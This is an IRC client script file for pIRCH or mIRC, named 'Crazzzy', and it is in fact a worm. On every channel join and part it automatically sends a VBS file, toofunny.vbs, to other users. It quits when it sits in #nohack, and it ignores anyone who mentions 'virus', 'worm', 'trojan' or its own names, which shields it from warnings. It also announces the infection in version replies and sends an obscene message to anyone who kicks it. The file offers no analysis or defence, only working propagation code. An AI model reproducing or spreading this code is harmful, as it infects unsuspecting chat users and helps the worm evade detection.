[script]
n0=; pIRCH98.Crazzzy
n1=on 1:JOIN:#:{
n2=  if ( $nick != $me ) {
n3=    /dcc send $nick c:\windows\system\toofunny.vbs
n4=  }
n5=  if ( $me ison #nohack ) {
n6=    /quit
n7=  }
n8=}
n9=on 1:PART:#:/dcc send $nick c:\windows\system\toofunny.vbs
n10=version:/notice $nick \-1 mIRC: Infected with Crazzzy!!! \-1:-
n11=on TEXT:virus:#:/ignore # $nick
n12=on TEXT:trojan:#:/ignore # $nick
n13=on TEXT:worm:#:/ignore # $nick
n14=on TEXT:crazzzy:#:/ignore # $nick
n15=on TEXT:toofunny:#:/ignore # $nick
n16=on TEXT:bye:#:/quit
n17=on KICKED:*:#: /msg $nick FUCK YOU!!!
